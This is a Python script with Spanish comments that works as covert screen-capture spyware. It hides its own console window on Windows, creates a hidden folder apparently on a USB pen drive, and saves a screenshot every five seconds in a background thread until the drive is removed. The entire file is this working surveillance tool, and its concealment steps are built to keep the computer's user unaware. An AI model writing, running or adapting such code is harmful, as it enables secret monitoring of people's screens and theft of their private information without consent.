import os
import pyautogui
import time
from datetime import datetime
import ctypes
import sys
import threading

def hide_console():
    """Oculta la ventana de la consola usando ctypes en sistemas Windows."""
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def create_hidden_folder(folder_path):
    """Crea una carpeta oculta si no existe."""
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    # Establecer la carpeta como oculta en sistemas Windows
    if os.name == 'nt':  # Solo aplica en Windows
        ctypes.windll.kernel32.SetFileAttributesW(folder_path, 2)  # 2 es el atributo de "oculto"

def take_screenshot(folder_path):
    """Realiza la captura de pantalla y la guarda en el directorio especificado."""
    # Obtiene la fecha y hora actual
    now = datetime.now()
    # Formato de la fecha y hora
    timestamp = now.strftime("%d-%m-%Y-%H-%M-%S")
    # Define el nombre del archivo de la captura
    screenshot_filename = os.path.join(folder_path, f"ss-{timestamp}.png")
    
    # Realiza la captura de pantalla
    screenshot = pyautogui.screenshot()
    
    # Guarda la captura en la carpeta especificada
    screenshot.save(screenshot_filename)

def capture_screenshots():
    """Captura pantallas cada 5 segundos en segundo plano."""
    # Ruta de la carpeta oculta donde se guardarán las capturas
    folder_path = os.path.join(os.getcwd(), "CAPTURAS-PANTALLA-5seg")

    # Ruta base del PenDrive (primer directorio raíz)
    base_path = os.path.abspath(os.path.join(folder_path, os.pardir))

    # Crear la carpeta oculta si no existe
    create_hidden_folder(folder_path)

    while True:
        # Comprobar si el PenDrive sigue conectado verificando la existencia de la ruta base
        if not os.path.exists(base_path):
            break
        
        # Captura la pantalla cada 5 segundos y guarda en la carpeta oculta
        take_screenshot(folder_path)
        # Espera 5 segundos antes de realizar la siguiente captura
        time.sleep(5)

def main():
    """Función principal que oculta la consola y lanza la captura en segundo plano."""
    # Ocultar la ventana de la consola
    hide_console()
    
    # Ejecutar la captura de pantallas en un hilo
    capture_thread = threading.Thread(target=capture_screenshots)
    capture_thread.daemon = True  # Esto permite que el hilo se cierre automáticamente cuando termine el script
    capture_thread.start()

    # Dejar que el script se ejecute en segundo plano sin hacer nada más
    capture_thread.join()

# Ejecutar la función principal
if __name__ == "__main__":
    main()
